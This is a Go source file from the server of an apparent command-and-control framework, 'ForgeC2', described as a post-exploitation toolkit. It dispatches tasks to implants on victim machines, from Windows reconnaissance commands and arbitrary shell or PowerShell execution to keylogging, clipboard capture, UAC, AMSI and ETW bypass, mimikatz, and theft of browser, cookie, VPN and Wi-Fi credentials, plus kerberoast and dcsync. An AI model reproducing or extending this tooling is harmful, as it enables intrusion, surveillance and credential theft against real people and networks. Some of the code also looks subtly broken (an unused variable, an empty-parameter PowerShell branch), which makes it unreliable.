package server

import (
	"fmt"
	"net/http"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleToolkitPage(c *gin.Context) {
	stats := s.getNavStats()

	var agents []db.Implant
	s.db.Order("last_seen desc").Limit(50).Find(&agents)
	for i := range agents {
		agents[i].Status = s.agentStatus(agents[i]).Status
	}

	var recentTasks []db.Task
	s.db.Where("status IN ('completed','failed')").
		Order("created_at desc").Limit(20).Find(&recentTasks)

	var agentTasks []db.Task
	s.db.Where("agent_id = ? AND status IN ('completed','failed')", "").
		Order("created_at desc").Limit(10).Find(&agentTasks)

	data := gin.H{
		"Title": "ForgeC2 - Post-Exploitation Toolkit",
		"ActiveNav":   "toolkit",
		"Stats":       stats,
		"Agents":      agents,
		"RecentTasks": recentTasks,
	}
	s.renderPage(c, "toolkit_content", data)
}

func (s *Server) handleToolkitQuickAction(c *gin.Context) {
	agentID := c.Param("id")
	action := c.PostForm("action")
	param := c.PostForm("param")
	shell := c.PostForm("shell")
	user := c.GetString("username")

	taskType, command := buildQuickActionCommand(action, param, shell)

	task := db.Task{
		AgentID:   agentID,
		Type:      taskType,
		Command:   command,
		Shell:     shell,
		Status:    "pending",
		CreatedBy: user,
		CreatedAt: time.Now(),
		UpdatedAt: time.Now(),
	}

	if err := s.db.Create(&task).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	s.LogAuditRecord(c, "toolkit_action",
		fmt.Sprintf("Toolkit action %s sent to agent %s (task #%d)", action, agentID, task.ID),
		agentID, fmt.Sprintf("Action: %s, Param: %s", action, param),
		true, nil)

	s.broadcastTaskUpdate(agentID, task)

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"task_id": task.ID,
		"message": fmt.Sprintf("Action %s dispatched to agent", action),
	})
}

func buildQuickActionCommand(action, param, shell string) (string, string) {
	switch action {
	case "whoami":
		return "shell", "whoami"
	case "hostname":
		return "shell", "hostname"
	case "ipconfig":
		return "shell", "ipconfig /all"
	case "systeminfo":
		return "shell", "systeminfo"
	case "netstat":
		return "shell", "netstat -ano"
	case "netusers":
		return "shell", "net user"
	case "netlocalgroup":
		return "shell", "net localgroup administrators"
	case "tasklist":
		return "shell", "tasklist /v"
	case "ps":
		return "ps", ""
	case "screenshot":
		return "screenshot", ""
	case "av":
		return "shell", `wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState /format:csv 2>nul`
	case "whoami_priv":
		return "shell", "whoami /priv"
	case "whoami_groups":
		return "shell", "whoami /groups"
	case "arp":
		return "shell", "arp -a"
	case "route":
		return "shell", "route print"
	case "netstat_an":
		return "shell", "netstat -an"
	case "netstat_b":
		return "shell", "netstat -b"
	case "schtasks":
		return "shell", "schtasks /query /fo LIST /v"
	case "services":
		return "shell", "sc query type= service state= all"
	case "drivers":
		return "shell", "fltmc instances"
	case "env":
		return "shell", "set"
	case "uptime":
		return "shell", "net statistics workstation"
	case "powershell":
		if param != "" {
			return "powerpick", param
		}
		return "shell", fmt.Sprintf("powershell -Enc %s", param)
	case "shell":
		if param != "" {
			return "shell", param
		}
		return "shell", param
	case "keylogger_start":
		return "keylogger_start", ""
	case "keylogger_stop":
		return "keylogger_stop", ""
	case "keylogger_dump":
		return "keylogger_dump", ""
	case "clipboard_get":
		return "clipboard_get", ""
	case "beacon_now":
		return "beacon_now", ""
	case "elevate":
		return "elevate", ""
	case "uac_bypass":
		return "uac_bypass", ""
	case "amsi_bypass":
		return "amsi_bypass", ""
	case "etw_bypass":
		return "etw_bypass", ""
	case "mimikatz":
		return "mimikatz", ""
	case "creds":
		return "creds_dump", ""
	case "browser_steal":
		return "browser_steal", ""
	case "cookie_export":
		return "cookie_export", "all"
	case "vpn_creds":
		return "vpn_creds", ""
	case "wifi_creds":
		return "wifi_creds", ""
	case "kerberoast":
		return "kerberoast", ""
	case "dcsync":
		return "dcsync", param
	case "privesc_check":
		return "privesc_check", "all"
	default:
		return "shell", action
	}
}

func (s *Server) handleToolkitRecentResults(c *gin.Context) {
	var tasks []db.Task
	s.db.Where("status IN ('completed','failed')").
		Order("created_at desc").Limit(50).Find(&tasks)

	c.JSON(http.StatusOK, gin.H{"tasks": tasks})
}

func (s *Server) handleToolkitAgentInfo(c *gin.Context) {
	agentID := c.Param("id")

	var agent db.Implant
	if err := s.db.Where("id = ?", agentID).First(&agent).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}

	var taskCount, completedCount int64
	s.db.Model(&db.Task{}).Where("agent_id = ?", agentID).Count(&taskCount)
	s.db.Model(&db.Task{}).Where("agent_id = ? AND status = 'completed'", agentID).Count(&completedCount)

	successRate := 0.0
	if taskCount > 0 {
		successRate = float64(completedCount) / float64(taskCount) * 100
	}

	c.JSON(http.StatusOK, gin.H{
		"agent":        agent,
		"task_count":   taskCount,
		"success_rate": fmt.Sprintf("%.1f", successRate),
	})
}

func (s *Server) handleToolkitAgentTasks(c *gin.Context) {
	agentID := c.Param("id")

	var tasks []db.Task
	s.db.Where("agent_id = ?", agentID).
		Order("created_at desc").Limit(30).Find(&tasks)

	c.JSON(http.StatusOK, gin.H{"tasks": tasks})
}
